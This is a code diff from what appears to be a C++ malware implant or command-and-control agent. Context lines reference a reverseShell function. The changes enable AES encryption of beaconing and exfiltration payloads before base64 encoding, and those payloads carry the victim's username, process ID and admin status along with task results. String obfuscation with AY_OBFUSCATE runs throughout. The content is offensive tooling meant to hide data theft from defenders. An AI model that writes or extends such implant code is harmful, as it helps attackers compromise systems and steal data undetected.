@@ -480,7 +480,6 @@ void reverseShell(const char* shellConfigurationData)
 	}
 }
 
-// both the beaconing and exfil should be AES encrypted with a protected key but padding is an issue
 std::string beaconingRequestData()
 {
 	char* username = currentUser();
@@ -499,11 +498,11 @@ std::string beaconingRequestData()
 	cJSON_AddNumberToObject(dataRequest, AY_OBFUSCATE("pid"), pid);
 	cJSON_AddBoolToObject(dataRequest, AY_OBFUSCATE("isAdmin"), isAdmin);
 
-	std::string b64Data = Conversion::base64Encode(dataRequest);
-
 	// AES encryption here - warning, uses a hardcoded key
-	//std::vector<unsigned char> encrypted_traffic = Encrypt::encryptNetworkTraffic(b64Data);
-	//std::string encrypted_data_string = { encrypted_traffic.begin(), encrypted_traffic.end() };
+	std::vector<unsigned char> encrypted_traffic = Encrypt::encryptNetworkTraffic(cJSON_Print(dataRequest));
+	std::string encrypted_data_string = { encrypted_traffic.begin(), encrypted_traffic.end() };
+
+	std::string b64Data = Conversion::base64Encode(encrypted_data_string);
 
 	return b64Data;
 }
@@ -517,11 +516,11 @@ std::string buildExfilBuffer(std::string buffer)
 	cJSON_AddStringToObject(dataRequest, AY_OBFUSCATE("success"), AY_OBFUSCATE("true"));
 	cJSON_AddStringToObject(dataRequest, AY_OBFUSCATE("task_result"), exfilData);
 
-	std::string b64Data = Conversion::base64Encode(dataRequest);
-
 	// AES encryption here - warning, uses a hardcoded key
-	//std::vector<unsigned char> encrypted_traffic = Encrypt::encryptNetworkTraffic(b64Data);
-	//std::string encrypted_data_string = { encrypted_traffic.begin(), encrypted_traffic.end() };
+	std::vector<unsigned char> encrypted_traffic = Encrypt::encryptNetworkTraffic(cJSON_Print(dataRequest));
+	std::string encrypted_data_string = { encrypted_traffic.begin(), encrypted_traffic.end() };
+
+	std::string b64Data = Conversion::base64Encode(encrypted_data_string);
 
 	return b64Data;
 }
